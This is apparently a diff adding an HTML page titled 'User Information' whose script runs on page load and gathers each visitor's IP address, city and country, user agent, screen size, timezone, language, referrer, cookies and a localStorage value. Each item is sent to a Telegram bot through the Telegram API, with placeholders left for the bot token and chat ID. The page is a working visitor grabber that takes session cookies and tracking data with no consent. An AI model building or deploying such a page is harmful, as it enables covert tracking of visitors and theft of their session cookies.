@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>User Information</title>
+    <style>
+        /* Add your CSS styles here */
+    </style>
+</head>
+<body>
+    <h1>User Information</h1>
+    <p>IP Address: <span id="ipAddress"></span></p>
+    <p>Location: <span id="location"></span></p>
+    <p>Device Name: <span id="deviceName"></span></p>
+    <p>Browser Version: <span id="browserVersion"></span></p>
+    <p>Operating System: <span id="operatingSystem"></span></p>
+    <p>Screen Resolution: <span id="screenResolution"></span></p>
+    <p>Timezone: <span id="timezone"></span></p>
+    <p>Language: <span id="language"></span></p>
+    <p>Referrer: <span id="referrer"></span></p>
+    <p>Cookies: <span id="cookies"></span></p>
+    <p>Local Storage: <span id="localStorage"></span></p>
+
+    <script>
+        // Function to get IP address
+        function getIPAddress() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ipAddress').innerText = data.ip;
+                    sendToTelegram('IP Address: ' + data.ip);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        }
+
+        // Function to get location
+        function getLocation() {
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('location').innerText = data.city + ', ' + data.region + ', ' + data.country;
+                    sendToTelegram('Location: ' + data.city + ', ' + data.region + ', ' + data.country);
+                })
+                .catch(error => {
+                    console.error('Error fetching location:', error);
+                });
+        }
+
+        // Function to get device name
+        function getDeviceName() {
+            document.getElementById('deviceName').innerText = navigator.userAgent;
+            sendToTelegram('Device Name: ' + navigator.userAgent);
+        }
+
+        // Function to get browser version
+        function getBrowserVersion() {
+            document.getElementById('browserVersion').innerText = navigator.userAgent;
+            sendToTelegram('Browser Version: ' + navigator.userAgent);
+        }
+
+        // Function to get operating system
+        function getOperatingSystem() {
+            document.getElementById('operatingSystem').innerText = navigator.userAgent;
+            sendToTelegram('Operating System: ' + navigator.userAgent);
+        }
+
+        // Function to get screen resolution
+        function getScreenResolution() {
+            document.getElementById('screenResolution').innerText = window.screen.width + 'x' + window.screen.height;
+            sendToTelegram('Screen Resolution: ' + window.screen.width + 'x' + window.screen.height);
+        }
+
+        // Function to get timezone
+        function getTimezone() {
+            document.getElementById('timezone').innerText = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            sendToTelegram('Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone);
+        }
+
+        // Function to get language
+        function getLanguage() {
+            document.getElementById('language').innerText = navigator.language;
+            sendToTelegram('Language: ' + navigator.language);
+        }
+
+        // Function to get referrer
+        function getReferrer() {
+            document.getElementById('referrer').innerText = document.referrer;
+            sendToTelegram('Referrer: ' + document.referrer);
+        }
+
+        // Function to get cookies
+        function getCookies() {
+            document.getElementById('cookies').innerText = document.cookie;
+            sendToTelegram('Cookies: ' + document.cookie);
+        }
+
+        // Function to get local storage
+        function getLocalStorage() {
+            document.getElementById('localStorage').innerText = localStorage.getItem('exampleKey');
+            sendToTelegram('Local Storage: ' + localStorage.getItem('exampleKey'));
+        }
+
+        // Function to send information to Telegram
+        function sendToTelegram(message) {
+            fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: '<YOUR_CHAT_ID>',
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+            });
+        }
+
+        // Call the functions to fetch user information
+        getIPAddress();
+        getLocation();
+        getDeviceName();
+        getBrowserVersion();
+        getOperatingSystem();
+        getScreenResolution();
+        getTimezone();
+        getLanguage();
+        getReferrer();
+        getCookies();
+        getLocalStorage();
+    </script>
+</body>
+</html>
